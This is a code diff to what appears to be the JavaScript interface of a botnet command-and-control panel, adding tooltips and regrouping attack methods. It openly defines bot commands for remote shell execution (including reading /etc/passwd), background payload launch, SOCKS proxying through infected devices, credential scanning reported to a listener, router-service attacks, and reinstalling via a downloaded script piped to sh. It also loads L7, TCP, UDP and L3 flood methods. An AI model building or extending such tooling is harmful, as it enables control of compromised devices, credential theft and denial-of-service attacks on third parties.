@@ -898,8 +898,8 @@ function submitSocksModal() {
 // ---------------------------------------------------------------------------
 
 var cmdArgDefs = {
-  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd' }],
-  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &' }],
+  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd', tooltip: 'Shell command to execute on targeted bots. Output is returned via C2.' }],
+  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &', tooltip: 'Command to run in background on bots. No output returned — fire and forget.' }],
   '!socks': [
     {
       id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
@@ -907,22 +907,22 @@ var cmdArgDefs = {
         { v: 'relay', t: 'Relay (backconnect)' }
       ]
     },
-    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' } },
-    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' } },
-    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '' },
-    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password' }
+    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'TCP port the SOCKS5 proxy listens on. Default 1080.' },
+    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' }, tooltip: 'Relay server the bot backconnects to. Select from configured relays.' },
+    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5 auth username. Leave empty for no auth.' },
+    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password', tooltip: 'SOCKS5 auth password. Leave empty for no auth.' }
   ],
   '!stopsocks': [],
   '!socksauth': [
-    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username' },
-    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password' }
+    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username', tooltip: 'New SOCKS5 username to set on the bot proxy.' },
+    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password', tooltip: 'New SOCKS5 password to set on the bot proxy.' }
   ],
   '!info': [], '!persist': [],
-  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)' }],
+  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)', tooltip: 'Address of the scan listener server that receives credential results from bots.' }],
   '!stopscan': [],
   '!tr064': [], '!stoptr064': [],
   '!hnap': [], '!stophnap': [],
-  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh' }],
+  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh', tooltip: 'URL to a loader script. Bot kills itself, downloads this script, and pipes it to sh.' }],
   '!lolnogtfo': []
 };
 
@@ -934,13 +934,14 @@ function updateArgFields() {
   var html = '';
   defs.forEach(function (d) {
     var vis = d.showWhen ? 'display:none' : '';
-    html += '<div class="cmd-group" id="grp-' + d.id + '" style="' + vis + '"><label>' + d.label + '</label>';
+    var tip = d.tooltip ? ' title="' + d.tooltip + '"' : '';
+    html += '<div class="cmd-group" id="grp-' + d.id + '" style="' + vis + '"><label' + tip + '>' + d.label + (d.tooltip ? ' <span style="cursor:help;opacity:0.4;font-size:11px" title="' + d.tooltip + '">&#9432;</span>' : '') + '</label>';
     if (d.type === 'select') {
-      html += '<select id="' + d.id + '" onchange="updateConditionalFields()">';
+      html += '<select id="' + d.id + '"' + tip + ' onchange="updateConditionalFields()">';
       d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
       html += '</select>';
     } else {
-      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
+      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '"' + tip + '>';
     }
     html += '</div>';
   });
@@ -2159,17 +2160,19 @@ var atkMethods = [];
 function loadAttackMethods() {
   fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
     atkMethods = methods;
-    var udpGrp = document.getElementById('atk-udp-group');
+    var l7Grp = document.getElementById('atk-l7-group');
     var tcpGrp = document.getElementById('atk-tcp-group');
+    var udpGrp = document.getElementById('atk-udp-group');
     var l3Grp = document.getElementById('atk-l3-group');
     if (!udpGrp) return;
-    udpGrp.innerHTML = ''; tcpGrp.innerHTML = ''; l3Grp.innerHTML = '';
+    l7Grp.innerHTML = ''; tcpGrp.innerHTML = ''; udpGrp.innerHTML = ''; l3Grp.innerHTML = '';
     methods.forEach(function (m) {
       var opt = document.createElement('option');
       opt.value = m.id;
       opt.textContent = m.name;
-      if (m.category === 'udp') udpGrp.appendChild(opt);
+      if (m.category === 'l7') l7Grp.appendChild(opt);
       else if (m.category === 'tcp') tcpGrp.appendChild(opt);
+      else if (m.category === 'udp') udpGrp.appendChild(opt);
       else l3Grp.appendChild(opt);
     });
     updateAtkMethodInfo();
